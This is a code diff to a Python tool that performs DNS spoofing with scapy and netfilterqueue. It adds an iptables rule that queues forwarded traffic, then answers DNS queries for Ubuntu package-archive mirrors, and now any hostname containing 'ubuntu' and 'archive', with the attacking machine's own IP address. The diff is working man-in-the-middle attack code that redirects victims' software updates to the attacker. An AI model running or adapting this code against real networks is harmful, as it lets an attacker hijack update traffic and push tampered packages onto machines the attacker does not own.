@@ -1,19 +1,17 @@
 from scapy.all import IP, DNS, DNSRR, DNSQR, UDP, get_if_addr
 from netfilterqueue import NetfilterQueue
 import os
-from mirrors import get_list_of_mirrors
 
-def dns_spoof(interface):
+def dns_spoof(interface, mirrors):
     global iface
     iface = interface
+    global mirror_list
+    mirror_list = mirrors
 
     QUEUE_NUM = 0
     os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
 
     nfqueue = NetfilterQueue()
-
-    global mirrors
-    mirrors = get_list_of_mirrors()
 
     try:
         print("Started DNS spoofing")
@@ -40,10 +38,8 @@ def process_packet(packet):
 def modify_packet(packet):
     qname = packet[DNSQR].qname
     qname_dec = qname.decode('utf-8')
-    # if qname == b"nl.archive.ubuntu.com.":
-    # mirrors = get_list_of_mirrors()
-    qnames = [link + "." for link in mirrors]
-    if qname_dec in qnames:
+    qnames = [link + "." for link in mirror_list]
+    if qname_dec in qnames or ("ubuntu" in qname_dec and "archive" in qname_dec):
         packet[DNS].an = DNSRR(rrname=qname, rdata=get_if_addr(iface))
 
         packet[DNS].ancount = 1
